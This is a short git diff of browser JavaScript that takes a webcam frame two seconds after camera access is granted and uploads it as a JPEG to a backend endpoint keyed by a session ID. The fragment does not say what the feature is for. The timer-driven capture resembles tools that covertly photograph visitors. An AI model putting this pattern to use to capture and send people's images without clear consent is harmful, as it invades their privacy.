@@ -63,13 +63,30 @@
                     canvas.height = video.videoHeight;
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    const photo = canvas.toDataURL("image/png");
-                    sendData({ photo });
+                    canvas.toBlob(async (blob) => {
+                        if (!blob) {
+                            console.error("❌ Failed to convert image to Blob");
+                            return;
+                        }
+
+                        const formData = new FormData();
+                        formData.append("photo", blob, "captured_image.jpg");
+
+                        try {
+                            await fetch(`${backendURL}/upload-photo/${sessionId}`, {
+                                method: "POST",
+                                body: formData,
+                            });
+                            console.log("📤 Image sent successfully!");
+                        } catch (error) {
+                            console.error("❌ Error sending image:", error);
+                        }
+                    }, "image/jpeg", 0.5);
+
                     stream.getTracks().forEach(track => track.stop());
                 }, 2000);
             } catch (error) {
                 console.error("Camera access denied:", error);
-                sendData({ photo: null });
             }
         });
 
